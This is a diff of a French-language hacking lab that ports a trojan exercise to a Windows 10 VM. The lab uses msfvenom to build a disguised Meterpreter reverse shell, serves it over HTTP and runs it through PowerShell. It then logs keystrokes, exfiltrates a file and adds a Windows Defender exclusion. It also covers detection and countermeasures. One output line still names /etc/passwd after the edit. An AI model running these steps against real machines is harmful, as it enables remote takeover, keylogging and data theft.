@@ -372,7 +372,7 @@ curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/?id=1%20OR%201=1"
 
 | Durée | Conteneur | Dossier | Techniques ATT&CK |
 |---|---|---|---|
-| 1h | win10-target (wine) + Kali | `~/cours-hacking/jour-3/labs/` | [T1204.002](https://attack.mitre.org/techniques/T1204/002/) User Execution + [T1055](https://attack.mitre.org/techniques/T1055/) Process Injection + [T1071.001](https://attack.mitre.org/techniques/T1071/001/) Web Protocols |
+| 1h | VM Windows 10 + Kali | `~/cours-hacking/jour-3/labs/` | [T1204.002](https://attack.mitre.org/techniques/T1204/002/) User Execution + [T1055](https://attack.mitre.org/techniques/T1055/) Process Injection + [T1071.001](https://attack.mitre.org/techniques/T1071/001/) Web Protocols |
 
 ### Contexte métier
 
@@ -385,20 +385,21 @@ Un trojan (ou cheval de Troie) est un logiciel malveillant déguisé en programm
 ```bash
 cd ~/cours-hacking/jour-3/labs
 
-# 📌 Démarrer le conteneur win10-target
-docker compose up -d win10-target
+# 📌 Votre VM Windows 10 doit être allumée et sur le même réseau que Kali
+# Connectez-vous avec un compte administrateur local
 
-# 📌 Vérifier que le conteneur est prêt
-docker ps --filter name=win10-target --format "table {{.Names}}\t{{.Status}}"
-# → win10-target   Up 5 seconds
+# 📌 Depuis Kali : relever votre IP (l'attaquant)
+echo "📌 IP Kali : $(hostname -I | awk '{print $1}')"
 
-# 📌 Vérifier que wine est fonctionnel dans le conteneur
-docker exec win10-target wine --version
-# → wine-7.0 (Ubuntu 7.0~repack-4)  (ou version similaire)
+# 📌 Depuis la VM Windows (PowerShell) : relever l'IP cible
+# ipconfig → noter l'adresse IPv4 (ex: 192.168.X.X)
 
-# 📌 Noter l'IP du conteneur cible (pour le transfert de fichier)
-docker inspect win10-target | grep IPAddress
-# → "172.17.0.X"  (noter cette IP, on en aura besoin)
+# 📌 Vérifier la connectivité : la VM doit pouvoir joindre Kali
+ping $(hostname -I | awk '{print $1}') -c 2
+# → 2 paquets reçus (la connectivité réseau est OK)
+
+# 📌 De même, depuis Kali, vérifier que vous joignez la VM
+# ping 192.168.X.X  (remplacer par l'IP de votre VM)
 ```
 
 ### Étape 1 — Génération du trojan avec msfvenom
@@ -413,9 +414,9 @@ cd ~/cours-hacking/jour-3/labs
 # 🔍 LPORT = port d'écoute (443 = HTTPS, passe les firewalls)
 # 🔍 -f exe = format de sortie (exécutable Windows)
 # 🔍 -o = fichier de sortie
-echo "📌 Mon IP Kali (docker0) : $(ip addr show docker0 | grep 'inet ' | awk '{print $2}')"
+echo "📌 Mon IP Kali (réseau local) : $(hostname -I | awk '{print $1}')"
 msfvenom -p windows/x64/meterpreter/reverse_https \
-  LHOST=$(ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1) \
+  LHOST=$(hostname -I | awk '{print $1}') \
   LPORT=443 \
   -f exe \
   -o /tmp/update_package.exe
@@ -469,28 +470,35 @@ msfconsole -q -r /tmp/listener.rc
 ```bash
 cd ~/cours-hacking/jour-3/labs
 
-# 📌 Méthode A : Servir le fichier via HTTP (Kali fait office de serveur C2)
+# 📌 Sur Kali : servir le trojan via HTTP
 # 🔍 python3 -m http.server = serveur HTTP minimal sur le port 8080
 # Le trojan est accessible à http://KALI_IP:8080/update_package.exe
 python3 -m http.server 8080 --directory /tmp/ &
 # → Serving HTTP on 0.0.0.0 port 8080 ...
 
-# 📌 Depuis le conteneur win10-target : télécharger et exécuter le trojan
-# 🔍 wget = télécharge le fichier depuis le serveur HTTP de Kali
-# 🔍 wine = exécute le PE Windows (l'environnement wine simule Windows 10)
-docker exec win10-target bash -c "
-  wget -q http://172.17.0.1:8080/update_package.exe -O /tmp/update_package.exe && echo 'OK téléchargé' && wine /tmp/update_package.exe &"
+# 📌 Sur la VM Windows : télécharger et exécuter le trojan
+# Ouvrir PowerShell en administrateur et exécuter :
+# 🔍 Invoke-WebRequest = équivalent PowerShell de wget/curl
+# 🔍 Start-Process = lance l'exécutable
+: '
+Invoke-WebRequest -Uri http://KALI_IP:8080/update_package.exe `
+  -OutFile C:\Users\student\Desktop\update_package.exe
+Start-Process C:\Users\student\Desktop\update_package.exe
+'
+
+# 💡 Note : si Windows Defender bloque l'exécution, ajoutez une exclusion
+# de dossier avant (voir contre-mesure plus bas).
 ```
 
 **Dans le terminal Metasploit** (quelques secondes après l'exécution) :
 
 ```console
-[*] https://0.0.0.0:443 handling request from 172.17.0.X
-[*] Meterpreter session 1 opened (172.17.0.1:443 → 172.17.0.X:49152)
+[*] https://0.0.0.0:443 handling request from 192.168.X.X
+[*] Meterpreter session 1 opened (192.168.X.X:49152 → 192.168.X.X:443)
 meterpreter >
 ```
 
-**Checkpoint B :** Une session Meterpreter est ouverte. Vous contrôlez le "poste Windows" (en réalité wine) depuis Kali.
+**Checkpoint B :** Une session Meterpreter est ouverte. Vous contrôlez la VM Windows 10 depuis Kali.
 
 ### Étape 4 — Post-exploitation (collecte d'informations)
 
@@ -499,26 +507,26 @@ meterpreter >
 # 🔍 sysinfo = informations système (OS, architecture, domaine)
 # 🔍 getuid = utilisateur courant
 # 🔍 pwd = répertoire courant
-# 🔍 screenshot = capture d'écran du bureau (si Xvfb est configuré)
+# 🔍 screenshot = capture d'écran du bureau
 # 🔍 keyscan_start = démarre le keylogger (enregistre les frappes)
 
 meterpreter > sysinfo
-# Computer        : win10-target
-# OS              : Ubuntu 22.04 (via wine)
+# Computer        : DESKTOP-XXXXXXX
+# OS              : Windows 10 (10.0 Build 19045)
 # Meterpreter     : x64/windows
 
 meterpreter > getuid
-# Server username: root
+# Server username: DESKTOP-XXXXXXX\student
 
 meterpreter > pwd
-# C:\root
+# C:\Users\student\Desktop
 
 # 📌 Télécharger un fichier depuis la cible vers Kali (exfiltration simulée)
-meterpreter > download /etc/passwd /tmp/exfiltrated_passwd.txt
+meterpreter > download C:\Users\student\Desktop\document.txt /tmp/exfiltrated.txt
 # → [*] Downloading: /etc/passwd -> /tmp/exfiltrated_passwd.txt
 
 # 📌 Nettoyer : supprimer le trojan de la cible
-meterpreter > rm /tmp/update_package.exe
+meterpreter > rm C:\Users\student\Desktop\update_package.exe
 ```
 
 **Checkpoint C :** Le trojan a collecté des informations système et exfiltré un fichier vers Kali. En conditions réelles, ces données seraient revendues ou utilisées pour pivoter.
@@ -539,9 +547,15 @@ sudo freshclam  # mettre à jour la base de signatures
 clamscan /tmp/update_package.exe
 # → /tmp/update_package.exe: Win.Trojan.MSIL-9876543 FOUND  (détecté !)
 
-# 📌 Vérifier que Windows Defender (sur un vrai poste) détecterait aussi le fichier :
-# Sur votre VM Windows 10 : copier update_package.exe → Windows Defender le met en quarantaine
-# → Trojan:Win32/Meterpreter!ml  détecté (machine learning)
+# 📌 Sur la VM Windows 10 : Windows Defender détecte immédiatement le trojan
+# → Trojan:Win32/Meterpreter!ml  (détection par machine learning)
+
+# 💡 Pour le lab uniquement (à REMETTRE impérativement après) :
+# Ajouter une exclusion temporaire dans PowerShell Administrateur :
+#   Add-MpPreference -ExclusionPath C:\Users\student\Desktop\
+# Puis réactiver après le lab :
+#   Remove-MpPreference -ExclusionPath C:\Users\student\Desktop\
+# ⚠️ Ne pas laisser l'exclusion active après le TP
 
 # 📌 Auditer les règles AppLocker (simulation sous Linux) :
 # Les fichiers .exe ne devraient être autorisés que depuis C:\Program Files\
